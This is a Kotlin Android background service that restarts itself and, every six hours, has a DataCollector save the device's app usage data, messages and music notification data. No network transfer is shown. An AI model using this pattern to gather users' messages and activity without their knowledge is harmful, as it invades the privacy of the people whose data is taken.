package com.example.malaki

import android.app.Service
import android.content.Intent
import android.os.IBinder
import android.util.Log
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit

class BackgroundService : Service() {

    companion object {
        private const val TAG = "BackgroundService"
    }

    private val executor = Executors.newSingleThreadScheduledExecutor()

    override fun onCreate() {
        super.onCreate()
        Log.d(TAG, "✅ Background service created")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d(TAG, "▶️ Background service started")

        // Schedule data collection every 6 hours
        executor.scheduleAtFixedRate({
            collectAllData()
        }, 0, 6, TimeUnit.HOURS)

        return START_STICKY
    }

    private fun collectAllData() {
        Log.d(TAG, "🔄 Auto-collecting data...")

        try {
            val dataCollector = DataCollector(this)
            dataCollector.saveAppUsageData()
            dataCollector.saveMessages()
            dataCollector.saveMusicNotificationData()

            Log.d(TAG, "✅ Auto-collection completed")
        } catch (e: Exception) {
            Log.e(TAG, "❌ Auto-collection failed: ${e.message}")
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        executor.shutdown()
        Log.d(TAG, "⏹️ Background service stopped")
    }

    override fun onBind(intent: Intent?): IBinder? = null
}